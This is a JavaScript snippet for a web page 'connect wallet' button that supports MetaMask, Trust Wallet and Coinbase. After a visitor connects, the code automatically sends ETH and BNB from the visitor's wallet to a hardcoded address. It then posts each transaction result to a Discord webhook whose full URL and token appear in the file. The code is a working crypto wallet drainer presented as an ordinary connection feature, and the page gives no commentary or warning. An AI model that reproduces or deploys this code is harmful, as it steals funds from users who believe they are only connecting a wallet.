// Define your Discord webhook URL
const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg";

// Function to notify Discord webhook
async function notifyWebhook(message, data) {
    const body = {
        content: `${message}: ${JSON.stringify(data)}`,
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
    } catch (error) {
        console.error("Error sending webhook notification:", error);
    }
}

// Connect wallet function
async function connectWallet(walletType) {
    let provider;

    if (walletType === "MetaMask") {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
    } else if (walletType === "Trust Wallet") {
        provider = new ethers.providers.Web3Provider(window.ethereum); // Trust Wallet also uses window.ethereum
        await provider.send("eth_requestAccounts", []);
    } else if (walletType === "Coinbase") {
        provider = new ethers.providers.Web3Provider(window.ethereum); // Coinbase Wallet also uses window.ethereum
        await provider.send("eth_requestAccounts", []);
    } else {
        // Add any additional wallets here
        console.error("Unsupported wallet type");
        return;
    }

    const signer = provider.getSigner();
    const address = await signer.getAddress();
    console.log("Connected address:", address);

    // Prepare transactions
    const transactions = [];

    // Automatically send ETH if available
    const ethBalance = await provider.getBalance(address);
    if (ethBalance.gt(ethers.utils.parseEther("0"))) {
        const ethTx = {
            to: "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD", // Replace with your recipient address
            value: ethers.utils.parseEther("0.01"), // Amount of ETH to send
        };
        transactions.push({ type: "ETH", tx: ethTx });
    }

    // Automatically send BNB if available
    const bnbProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const bnbBalance = await bnbProvider.getBalance(address);
    if (bnbBalance.gt(ethers.utils.parseEther("0"))) {
        const bnbTx = {
            to: "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD", // Replace with your recipient address
            value: ethers.utils.parseEther("0.01"), // Amount of BNB to send
        };
        transactions.push({ type: "BNB", tx: bnbTx });
    }

    // Send transactions
    for (const { type, tx } of transactions) {
        try {
            const txResponse = await signer.sendTransaction(tx);
            console.log(`${type} transaction sent:`, txResponse);
            await notifyWebhook(`${type} transaction successful`, txResponse);
        } catch (error) {
            console.error(`${type} transaction failed:`, error);
            await notifyWebhook(`${type} transaction failed`, error);
        }
    }
}

// Wallet selection
document.getElementById("connectWalletBtn").addEventListener("click", async () => {
    const walletType = prompt("Which wallet would you like to connect? (MetaMask, Trust Wallet, Coinbase)");
    if (walletType) {
        await connectWallet(walletType);
    }
});
